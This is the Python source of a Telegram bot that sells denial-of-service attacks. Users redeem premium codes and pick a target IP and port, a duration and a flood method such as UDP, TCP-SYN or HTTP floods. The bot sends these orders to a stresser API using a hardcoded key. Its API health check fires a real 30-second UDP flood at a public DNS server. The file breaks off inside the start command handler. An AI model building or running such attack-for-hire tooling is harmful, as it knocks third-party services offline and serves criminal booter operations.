# app.py - FULL COMPLETE WORKING VERSION
import os
import logging
import asyncio
import threading
import aiohttp
import time
import random
import string
import json
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
import pymongo
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
PORT = int(os.getenv("PORT", 8080))

# CONCURRENT SETTINGS
MAX_CONCURRENT_PER_USER_FIRST = 3  # First 2 attacks
MAX_CONCURRENT_PER_USER_LAST = 2   # After 2 attacks
MAX_TOTAL_CONCURRENT = 8
MIN_DURATION = 60
MAX_DURATION = 300
MIN_COOLDOWN = 30
MAX_COOLDOWN = 70

ATTACK_METHODS = [
    "UDP-FLOOD", "UDP-VSE", "UDP-DNS",
    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
    "ICMP-FLOOD", "GRE-FLOOD",
    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
]

METHOD_MAP = {
    "UDP-FLOOD": "udp-flood",
    "UDP-VSE": "udp-vse", 
    "UDP-DNS": "udp-dns",
    "TCP-SYN": "tcp-syn",
    "TCP-ACK": "tcp-ack",
    "TCP-STOMP": "tcp-stomp",
    "TCP-HANDSHAKE": "tcp-handshake",
    "ICMP-FLOOD": "icmp-flood",
    "GRE-FLOOD": "gre-flood",
    "TLSV2": "TLSV2",
    "HTTPS-MIX": "HTTPS-MIX",
    "HTTP-KILLER": "HTTP-KILLER",
    "HTTP-DESTROYER": "HTTP-DESTROYER",
    "HTTP-BYPASSER": "HTTP-BYPASSER"
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 GURU Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = False
        self.users = {}
        self.codes = {}
        self.logs = []
        self.admins = {}
        self.broadcasts = []
        self.settings = {"pause_all": False}
        
        try:
            if mongo_uri:
                self.client = MongoClient(
                    mongo_uri,
                    serverSelectionTimeoutMS=5000,
                    connectTimeoutMS=5000,
                    socketTimeoutMS=5000,
                    maxPoolSize=50
                )
                self.client.admin.command('ping')
                
                self.db = self.client["guru_bot"]
                self.users = self.db.users
                self.codes = self.db.redeem_codes
                self.logs = self.db.attack_logs
                self.admins = self.db.admins
                self.broadcasts = self.db.broadcasts
                self.settings = self.db.settings
                
                try:
                    self.users.create_index("user_id", unique=True)
                    self.codes.create_index("code", unique=True)
                    self.broadcasts.create_index("created_at", -1)
                    self.admins.create_index("user_id", unique=True)
                except Exception as e:
                    logger.warning(f"Index creation warning: {e}")
                
                if not self.settings.find_one({"_id": "bot_settings"}):
                    self.settings.insert_one({
                        "_id": "bot_settings",
                        "pause_all": False,
                        "paused_by": None,
                        "paused_at": None,
                        "pause_reason": None
                    })
                
                try:
                    user_count = self.users.count_documents({})
                    admin_count = self.admins.count_documents({})
                    code_count = self.codes.count_documents({})
                    logger.info(f"📊 Existing Data: {user_count} users, {admin_count} admins, {code_count} codes")
                except:
                    pass
                
                logger.info("✅ MongoDB connected successfully!")
                self.memory_mode = False
            else:
                raise Exception("No MongoDB URI provided")
        except Exception as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            self.memory_mode = True
            logger.warning("⚠️ Using in-memory storage (data will be lost on restart!)")
    
    def add_user(self, user_id, username=None, first_name=None):
        try:
            if not self.memory_mode:
                result = self.users.update_one(
                    {"user_id": user_id},
                    {"$setOnInsert": {
                        "username": username, 
                        "first_name": first_name, 
                        "last_active": datetime.now(),
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "ban_reason": None,
                        "banned_by": None,
                        "banned_at": None,
                        "last_attack_time": None,
                        "last_attack_duration": 0,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }},
                    upsert=True
                )
                return result
            else:
                if user_id not in self.users:
                    self.users[user_id] = {
                        "user_id": user_id, 
                        "username": username, 
                        "first_name": first_name,
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "last_attack_time": None,
                        "last_attack_duration": 0,
                        "attack_count": 0
                    }
                    return True
                return False
        except Exception as e:
            logger.error(f"Error adding user: {e}")
            return False
    
    def get_user(self, user_id):
        try:
            if not self.memory_mode:
                return self.users.find_one({"user_id": user_id})
            return self.users.get(user_id)
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None
    
    def get_user_plan(self, user_id):
        try:
            user = self.get_user(user_id)
            if not user:
                return "free", None
            
            plan = user.get("plan", "free")
            expiry = user.get("plan_expiry")
            
            if plan == "free":
                return "free", None
            
            if plan == "premium":
                if expiry is None:
                    return "premium", None
                
                if isinstance(expiry, str):
                    try:
                        expiry = datetime.fromisoformat(expiry)
                    except:
                        return "premium", None
                
                if expiry and isinstance(expiry, datetime):
                    if expiry < datetime.now():
                        return "premium", expiry
                    else:
                        return "premium", expiry
                else:
                    return "premium", None
            
            return plan, expiry
        except Exception as e:
            logger.error(f"Error getting user plan: {e}")
            return "free", None
    
    def update_user_plan(self, user_id, plan, expiry):
        try:
            if not self.memory_mode:
                expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else None
                result = self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": plan, 
                        "plan_expiry": expiry_str,
                        "has_used_code": True if plan == "premium" else False
                    }}
                )
                return result.modified_count > 0 or result.matched_count > 0
            else:
                if user_id in self.users:
                    self.users[user_id]["plan"] = plan
                    self.users[user_id]["plan_expiry"] = expiry
                    return True
                return False
        except Exception as e:
            logger.error(f"Error updating user plan: {e}")
            return False
    
    def get_user_stats(self, user_id):
        try:
            if not self.memory_mode:
                return self.logs.count_documents({"user_id": user_id})
            else:
                return len([l for l in self.logs if l.get("user_id") == user_id])
        except:
            return 0
    
    def get_total_attacks(self):
        try:
            if not self.memory_mode:
                return self.logs.count_documents({})
            return len(self.logs)
        except:
            return 0
    
    def is_admin(self, user_id):
        try:
            if not self.memory_mode:
                return self.admins.find_one({"user_id": user_id}) is not None
            return user_id in self.admins
        except:
            return False
    
    def get_admin_level(self, user_id):
        try:
            if not self.memory_mode:
                admin = self.admins.find_one({"user_id": user_id})
                return admin.get("level") if admin else None
            return self.admins.get(user_id, {}).get("level")
        except:
            return None
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, level, added_by):
        try:
            if not self.memory_mode:
                if self.admins.find_one({"user_id": user_id}):
                    return False
                self.admins.insert_one({
                    "user_id": user_id,
                    "username": username,
                    "level": level,
                    "added_by": added_by,
                    "added_at": datetime.now()
                })
                self.update_user_plan(user_id, "premium", None)
                return True
            else:
                if user_id in self.admins:
                    return False
                self.admins[user_id] = {"user_id": user_id, "level": level}
                if user_id in self.users:
                    self.users[user_id]["plan"] = "premium"
                    self.users[user_id]["plan_expiry"] = None
                return True
        except Exception as e:
            logger.error(f"Error adding admin: {e}")
            return False
    
    def remove_admin(self, user_id):
        try:
            if not self.memory_mode:
                result = self.admins.delete_one({"user_id": user_id})
                if result.deleted_count > 0:
                    return True
                return False
            else:
                if user_id in self.admins:
                    del self.admins[user_id]
                    return True
                return False
        except:
            return False
    
    def get_admins(self):
        try:
            if not self.memory_mode:
                return list(self.admins.find({}))
            return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
        except:
            return []
    
    def get_banned_users(self):
        try:
            if not self.memory_mode:
                return list(self.users.find({"is_banned": True}))
            return [uid for uid, data in self.users.items() if data.get("is_banned", False)]
        except:
            return []
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        try:
            if not self.memory_mode:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
                )
            elif user_id in self.users:
                self.users[user_id]["is_banned"] = True
                self.users[user_id]["ban_reason"] = reason
            return True
        except:
            return False
    
    def unban_user(self, user_id):
        try:
            if not self.memory_mode:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": False, "ban_reason": None, "banned_by": None, "banned_at": None}}
                )
            elif user_id in self.users:
                self.users[user_id]["is_banned"] = False
                self.users[user_id]["ban_reason"] = None
            return True
        except:
            return False
    
    def is_banned(self, user_id):
        try:
            user = self.get_user(user_id)
            return user.get("is_banned", False) if user else False
        except:
            return False
    
    def get_last_attack_time(self, user_id):
        try:
            user = self.get_user(user_id)
            if user:
                last_attack = user.get("last_attack_time")
                if last_attack and isinstance(last_attack, str):
                    try:
                        return datetime.fromisoformat(last_attack)
                    except:
                        return None
                return last_attack
            return None
        except:
            return None
    
    def get_last_attack_duration(self, user_id):
        try:
            user = self.get_user(user_id)
            if user:
                return user.get("last_attack_duration", 0)
            return 0
        except:
            return 0
    
    def update_last_attack(self, user_id, duration):
        try:
            if not self.memory_mode:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "last_attack_time": datetime.now().isoformat(),
                        "last_attack_duration": duration
                    },
                    "$inc": {"attack_count": 1}}
                )
            elif user_id in self.users:
                self.users[user_id]["last_attack_time"] = datetime.now()
                self.users[user_id]["last_attack_duration"] = duration
                self.users[user_id]["attack_count"] = self.users[user_id].get("attack_count", 0) + 1
            return True
        except:
            return False
    
    def get_attack_count(self, user_id):
        try:
            user = self.get_user(user_id)
            if user:
                return user.get("attack_count", 0)
            return 0
        except:
            return 0
    
    def create_code(self, code, days, created_by):
        try:
            if not self.memory_mode:
                if self.codes.find_one({"code": code}):
                    return False
                self.codes.insert_one({
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "used_by": None,
                    "used_at": None,
                    "is_used": False
                })
                return True
            else:
                if code in self.codes:
                    return False
                self.codes[code] = {
                    "code": code,
                    "access_days": days,
                    "created_at": datetime.now(),
                    "is_used": False
                }
                return True
        except Exception as e:
            logger.error(f"Error creating code: {e}")
            return False
    
    def use_code(self, code, user_id):
        try:
            if not self.memory_mode:
                code_data = self.codes.find_one({"code": code, "is_used": False})
                if not code_data:
                    return None
                
                self.codes.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                
                days = code_data['access_days']
                if days >= 3650:
                    expiry = None
                else:
                    expiry = datetime.now() + timedelta(days=days)
                
                if not self.get_user(user_id):
                    self.add_user(user_id)
                
                expiry_str = expiry.isoformat() if expiry else None
                
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": "premium",
                        "plan_expiry": expiry_str,
                        "has_used_code": True,
                        "code_used": code,
                        "redeem_date": datetime.now().isoformat()
                    }}
                )
                
                return code_data
            else:
                if code in self.codes and not self.codes[code]["is_used"]:
                    code_data = self.codes[code]
                    code_data["is_used"] = True
                    days = code_data['access_days']
                    if days >= 3650:
                        expiry = None
                    else:
                        expiry = datetime.now() + timedelta(days=days)
                    
                    if user_id in self.users:
                        self.users[user_id]["plan"] = "premium"
                        self.users[user_id]["plan_expiry"] = expiry
                        self.users[user_id]["has_used_code"] = True
                        self.users[user_id]["code_used"] = code
                        self.users[user_id]["redeem_date"] = datetime.now()
                        return code_data
            return None
        except Exception as e:
            logger.error(f"Error using code: {e}")
            return None
    
    def get_user_by_code(self, code):
        try:
            if not self.memory_mode:
                return self.users.find_one({"code_used": code})
            else:
                for user in self.users.values():
                    if user.get('code_used') == code:
                        return user
            return None
        except:
            return None

    def revoke_user_plan_by_code(self, code):
        try:
            user = self.get_user_by_code(code)
            if user:
                user_id = user['user_id']
                if not self.is_admin(user_id):
                    self.update_user_plan(user_id, "free", None)
                    return True
                else:
                    return False
            return False
        except:
            return False
    
    def get_codes(self, only_unused=False):
        try:
            if not self.memory_mode:
                query = {"is_used": False} if only_unused else {}
                return list(self.codes.find(query).sort("created_at", -1))
            else:
                codes = list(self.codes.values())
                if only_unused:
                    codes = [c for c in codes if not c["is_used"]]
                return codes
        except:
            return []
    
    def delete_code(self, code):
        try:
            if not self.memory_mode:
                result = self.codes.delete_one({"code": code})
                if result.deleted_count > 0:
                    return True
                return False
            else:
                if code in self.codes:
                    del self.codes[code]
                    return True
                return False
        except:
            return False
    
    def delete_used_codes(self):
        try:
            if not self.memory_mode:
                result = self.codes.delete_many({"is_used": True})
                return result.deleted_count
            else:
                count = 0
                for code in list(self.codes.keys()):
                    if self.codes[code].get("is_used", False):
                        del self.codes[code]
                        count += 1
                return count
        except:
            return 0
    
    def log_broadcast(self, broadcast_id, sent_by, total_users, successful, failed, media_type=None):
        try:
            if not self.memory_mode:
                self.broadcasts.insert_one({
                    "broadcast_id": broadcast_id,
                    "sent_by": sent_by,
                    "total_users": total_users,
                    "successful": successful,
                    "failed": failed,
                    "media_type": media_type,
                    "created_at": datetime.now()
                })
            else:
                self.broadcasts.append({
                    "broadcast_id": broadcast_id,
                    "sent_by": sent_by,
                    "total_users": total_users,
                    "successful": successful,
                    "failed": failed,
                    "media_type": media_type,
                    "created_at": datetime.now()
                })
            return True
        except:
            return False
    
    def get_broadcast_stats(self):
        try:
            if not self.memory_mode:
                return list(self.broadcasts.find({}).sort("created_at", -1).limit(10))
            else:
                return self.broadcasts[-10:]
        except:
            return []
    
    def get_pause_status(self):
        try:
            if not self.memory_mode:
                settings = self.settings.find_one({"_id": "bot_settings"})
                if settings:
                    return settings.get("pause_all", False)
            return self.settings.get("pause_all", False)
        except:
            return self.settings.get("pause_all", False)
    
    def get_pause_info(self):
        try:
            if not self.memory_mode:
                settings = self.settings.find_one({"_id": "bot_settings"})
                if settings:
                    return {
                        "paused": settings.get("pause_all", False),
                        "paused_by": settings.get("paused_by"),
                        "paused_at": settings.get("paused_at"),
                        "pause_reason": settings.get("pause_reason")
                    }
            return {
                "paused": self.settings.get("pause_all", False),
                "paused_by": None,
                "paused_at": None,
                "pause_reason": None
            }
        except:
            return {
                "paused": self.settings.get("pause_all", False),
                "paused_by": None,
                "paused_at": None,
                "pause_reason": None
            }
    
    def set_pause(self, paused, paused_by=None, reason=None):
        try:
            if not self.memory_mode:
                self.settings.update_one(
                    {"_id": "bot_settings"},
                    {"$set": {
                        "pause_all": paused,
                        "paused_by": paused_by,
                        "paused_at": datetime.now() if paused else None,
                        "pause_reason": reason
                    }},
                    upsert=True
                )
            self.settings["pause_all"] = paused
            return True
        except:
            self.settings["pause_all"] = paused
            return False
    
    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=2):
        try:
            log = {
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "status": status,
                "concurrent": concurrent_count,
                "response": response[:500] if response else None,
                "timestamp": datetime.now()
            }
            if not self.memory_mode:
                self.logs.insert_one(log)
            else:
                self.logs.append(log)
            
            self.update_last_attack(user_id, duration)
            
            user = self.get_user(user_id)
            username = user.get("username") if user else None
            first_name = user.get("first_name") if user else None
            return {
                "user_id": user_id,
                "username": username,
                "first_name": first_name,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "concurrent": concurrent_count
            }
        except:
            return None
    
    def get_all_users(self):
        try:
            if not self.memory_mode:
                return list(self.users.find({}))
            return list(self.users.values())
        except:
            return []

db = Database(MONGO_URI)

# ===== INITIALIZE OWNER =====
def init_owner():
    try:
        owner = db.get_user(OWNER_ID)
        if not owner:
            db.add_user(OWNER_ID, "owner", "Owner")
        
        if not db.is_admin(OWNER_ID):
            db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
        
        plan, expiry = db.get_user_plan(OWNER_ID)
        if plan != "premium":
            db.update_user_plan(OWNER_ID, "premium", None)
        logger.info(f"✅ Owner {OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing owner: {e}")

def init_pseudo_owner():
    try:
        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
            pseudo_owner = db.get_user(PSEUDO_OWNER_ID)
            if not pseudo_owner:
                db.add_user(PSEUDO_OWNER_ID, "pseudo_owner", "Pseudo Owner")
            
            if not db.is_admin(PSEUDO_OWNER_ID):
                db.add_admin(PSEUDO_OWNER_ID, "pseudo_owner", "pseudo_owner", OWNER_ID)
            
            plan, expiry = db.get_user_plan(PSEUDO_OWNER_ID)
            if plan != "premium":
                db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
            logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing pseudo owner: {e}")

init_owner()
init_pseudo_owner()

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.total_attacks = 0
        self.concurrent_busy = 0
        self.global_attack_running = False
        self.current_attacker = None
        self.attack_start_time = None
        self.current_attack_duration = 0
        self.attack_end_time = None
        self.attack_queue = []
        self.processing_queue = False
        
        self.global_cooldown_active = False
        self.global_cooldown_end = None
        self.last_attack_user = None
        self.last_attack_time = None
        self.last_attack_duration = 0
        self.user_active_attacks = {}
    
    def get_max_concurrent_for_user(self, user_id):
        attack_count = db.get_attack_count(user_id)
        if attack_count < 2:
            return MAX_CONCURRENT_PER_USER_FIRST
        else:
            return MAX_CONCURRENT_PER_USER_LAST
    
    def can_start_attack(self, user_id):
        with self.lock:
            if self.global_cooldown_active and self.global_cooldown_end:
                if datetime.now() < self.global_cooldown_end:
                    remaining = int((self.global_cooldown_end - datetime.now()).total_seconds())
                    return False, f"🌍 *Global Cooldown Active*\n\nWait {remaining}s before next attack."
            
            if self.concurrent_busy >= MAX_TOTAL_CONCURRENT:
                return False, f"❌ All concurrent slots are full ({self.concurrent_busy}/{MAX_TOTAL_CONCURRENT})\n\nPlease wait for an attack to finish."
            
            max_per_user = self.get_max_concurrent_for_user(user_id)
            user_attacks = self.user_active_attacks.get(user_id, 0)
            if user_attacks >= max_per_user:
                attack_count = db.get_attack_count(user_id)
                if attack_count < 2:
                    return False, f"❌ You have reached your limit ({user_attacks}/{MAX_CONCURRENT_PER_USER_FIRST})\n\nFirst 2 attacks: 3 concurrent each"
                else:
                    return False, f"❌ You have reached your limit ({user_attacks}/{MAX_CONCURRENT_PER_USER_LAST})\n\nAfter 2 attacks: 2 concurrent each"
            
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method, attack_num):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy += 1
            self.global_attack_running = True
            self.current_attacker = user_id
            self.attack_start_time = datetime.now()
            self.current_attack_duration = duration
            self.attack_end_time = datetime.now() + timedelta(seconds=duration + 5)
            
            self.user_active_attacks[user_id] = self.user_active_attacks.get(user_id, 0) + 1
            
            self.global_cooldown_active = True
            cooldown = duration + 5
            if cooldown < MIN_COOLDOWN:
                cooldown = MIN_COOLDOWN
            elif cooldown > MAX_COOLDOWN:
                cooldown = MAX_COOLDOWN
            self.global_cooldown_end = datetime.now() + timedelta(seconds=cooldown)
            self.last_attack_user = user_id
            self.last_attack_time = datetime.now()
            self.last_attack_duration = duration
            
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'attack_num': attack_num,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                user_id = self.active_attacks[attack_id]['user_id']
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                
                if user_id in self.user_active_attacks:
                    self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - 1)
                    if self.user_active_attacks[user_id] == 0:
                        del self.user_active_attacks[user_id]
                
                if self.concurrent_busy == 0:
                    self.global_attack_running = False
                    self.current_attacker = None
                    self.attack_start_time = None
                    self.attack_end_time = None
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            remaining = 0
            if self.attack_end_time:
                remaining = int((self.attack_end_time - datetime.now()).total_seconds())
                if remaining < 0:
                    remaining = 0
            
            global_cooldown_remaining = 0
            if self.global_cooldown_active and self.global_cooldown_end:
                global_cooldown_remaining = int((self.global_cooldown_end - datetime.now()).total_seconds())
                if global_cooldown_remaining < 0:
                    global_cooldown_remaining = 0
            
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max_total': MAX_TOTAL_CONCURRENT,
                'max_per_user_first': MAX_CONCURRENT_PER_USER_FIRST,
                'max_per_user_last': MAX_CONCURRENT_PER_USER_LAST,
                'is_running': self.global_attack_running,
                'current_user': self.current_attacker,
                'start_time': self.attack_start_time,
                'duration': self.current_attack_duration,
                'remaining': remaining,
                'global_cooldown_remaining': global_cooldown_remaining,
                'user_attacks': dict(self.user_active_attacks),
                'queue_size': len(self.attack_queue)
            }
    
    def add_to_queue(self, user_id, target, port, duration, method, context):
        self.attack_queue.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'context': context,
            'added_at': datetime.now()
        })
        
        if not self.processing_queue:
            asyncio.create_task(self.process_queue())
    
    async def process_queue(self):
        self.processing_queue = True
        while self.attack_queue:
            attack_data = self.attack_queue.pop(0)
            user_id = attack_data['user_id']
            
            can_start, msg = self.can_start_attack(user_id)
            if not can_start:
                try:
                    await attack_data['context'].bot.send_message(
                        chat_id=user_id,
                        text=f"⏳ *Queue Update*\n\n{msg}\n\nYour attack is still queued.",
                        parse_mode='Markdown'
                    )
                except:
                    pass
                continue
            
            try:
                attack_id = self.start_attack(
                    user_id, 
                    attack_data['target'], 
                    attack_data['port'], 
                    attack_data['duration'], 
                    attack_data['method'], 
                    0
                )
                
                asyncio.create_task(self.execute_attack(
                    attack_id,
                    attack_data['target'],
                    attack_data['port'],
                    attack_data['duration'],
                    user_id,
                    attack_data['context'],
                    attack_data['method']
                ))
                
            except Exception as e:
                logger.error(f"Queue attack failed: {e}")
                try:
                    await attack_data['context'].bot.send_message(
                        chat_id=user_id,
                        text=f"❌ *Attack Failed*\n\nError: {str(e)}",
                        parse_mode='Markdown'
                    )
                except:
                    pass
        
        self.processing_queue = False
    
    async def execute_attack(self, attack_id, target, port, duration, user_id, context, method):
        try:
            result = await send_api_attack(target, port, duration, user_id, context, method)
            
            if result:
                attack_info = db.log_attack(
                    user_id, target, port, duration, method,
                    "success" if result.get('success') else "failed",
                    str(result)
                )
                await send_attack_alert(attack_info)
            
            self.stop_attack(attack_id)
            self.cleanup()
            
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            self.stop_attack(attack_id)
            self.cleanup()
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
            if not self.active_attacks:
                self.global_attack_running = False
                self.current_attacker = None
                self.attack_start_time = None
                self.attack_end_time = None
            return len(to_remove)

attack_manager = AttackManager()

# ===== SEND ALERT TO ADMINS =====
async def send_attack_alert(attack_info):
    try:
        admins = db.get_admins()
        user = db.get_user(attack_info['user_id'])
        plan = user.get('plan', 'free') if user else 'free'
        
        message = (
            f"⚡ *ATTACK ALERT*\n\n"
            f"👤 User: {attack_info.get('first_name', 'Unknown')}\n"
            f"🆔 ID: `{attack_info['user_id']}`\n"
            f"📊 Plan: {plan.upper()}\n"
            f"🎯 Target: `{attack_info['target']}:{attack_info['port']}`\n"
            f"⏱️ Duration: {attack_info['duration']}s\n"
            f"📡 Method: {attack_info['method'].upper()}\n"
            f"🔄 Concurrent: {attack_info['concurrent']}/{MAX_TOTAL_CONCURRENT}\n"
            f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        for admin in admins:
            try:
                global application
                if application:
                    await application.bot.send_message(
                        admin['user_id'],
                        message,
                        parse_mode='Markdown'
                    )
            except:
                pass
    except Exception as e:
        logger.error(f"Alert error: {e}")

# ===== API ATTACK =====
async def send_api_attack(target, port, duration, user_id, context, method="UDP-FLOOD", attack_num=1):
    api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
    api_url = os.getenv("API_URL", "https://mrstresser.com/api")
    
    if not api_key:
        await context.bot.send_message(
            chat_id=user_id,
            text="❌ *API KEY MISSING*\n\nAPI key is not configured!",
            parse_mode='Markdown'
        )
        return None
    
    api_method = METHOD_MAP.get(method.upper(), "udp-flood")
    
    params = {
        "key": api_key,
        "host": target,
        "port": str(port),
        "time": str(duration),
        "method": api_method
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    
    status_msg = await context.bot.send_message(
        chat_id=user_id,
        text=f"🔥 *ATTACK STARTING*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
             f"📡 Method: `{method}`\n"
             f"🔄 Concurrent: `{attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`",
        parse_mode='Markdown'
    )
    
    try:
        timeout = aiohttp.ClientTimeout(total=duration + 30, connect=10)
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start_time = time.time()
            
            async with session.get(api_url, params=params) as response:
                elapsed = time.time() - start_time
                
                try:
                    response_text = await response.text(encoding='utf-8', errors='ignore')
                except:
                    response_text = "Unable to read response"
                
                if response.status == 200:
                    success_text = (
                        f"✅ *ATTACK SENT!*\n\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"⏱️ Duration: `{duration}s`\n"
                        f"📡 Method: `{method}`\n"
                        f"🔄 Concurrent: `{attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`\n"
                        f"📊 Status: Attack in progress...\n"
                        f"⏱️ Response: `{elapsed:.2f}s`"
                    )
                    await status_msg.edit_text(success_text, parse_mode='Markdown')
                    
                    await asyncio.sleep(duration)
                    
                    final_text = (
                        f"✅ *ATTACK COMPLETE!*\n\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"⏱️ Duration: `{duration}s`\n"
                        f"📡 Method: `{method}`\n"
                        f"🔄 Concurrent: `{attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`"
                    )
                    await status_msg.edit_text(final_text, parse_mode='Markdown')
                    
                    return {"success": True, "elapsed": elapsed}
                else:
                    error_text = (
                        f"❌ *ATTACK FAILED*\n\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"📡 Method: `{method}`\n"
                        f"❌ Status: HTTP {response.status}"
                    )
                    await status_msg.edit_text(error_text, parse_mode='Markdown')
                    return {"success": False}
                    
    except Exception as e:
        await status_msg.edit_text(
            f"❌ *ATTACK FAILED*\n\nError: {str(e)[:50]}",
            parse_mode='Markdown'
        )
        return {"success": False}

# ===== CHECK API STATUS =====
async def check_api_status():
    try:
        api_url = os.getenv("API_URL", "https://mrstresser.com/api")
        api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
        
        if not api_key:
            return False, "❌ API_KEY not configured!"
        
        params = {
            "key": api_key,
            "host": "8.8.8.8",
            "port": "53",
            "time": "30",
            "method": "udp-flood"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        
        timeout = aiohttp.ClientTimeout(total=35, connect=10)
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start_time = time.time()
            async with session.get(api_url, params=params) as response:
                elapsed = time.time() - start_time
                
                try:
                    response_text = await response.text(encoding='utf-8', errors='ignore')
                    response_data = json.loads(response_text)
                except:
                    response_text = "Unable to read response"
                    response_data = {}
                
                if response.status == 200:
                    if response_data.get('status') == 'success':
                        return True, f"✅ API Connected - Status: Success (Response: {elapsed:.2f}s)"
                    else:
                        return True, f"✅ API Connected - Status: {response_data.get('message', 'OK')} (Response: {elapsed:.2f}s)"
                else:
                    return False, f"❌ Error (Status: {response.status})"
    except Exception as e:
        return False, f"❌ Connection Failed: {str(e)[:50]}"

# ===== BOT COMMAND HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    context.user_data.clear()
    db.add_user(user_id, user.username, user.first_name)
    
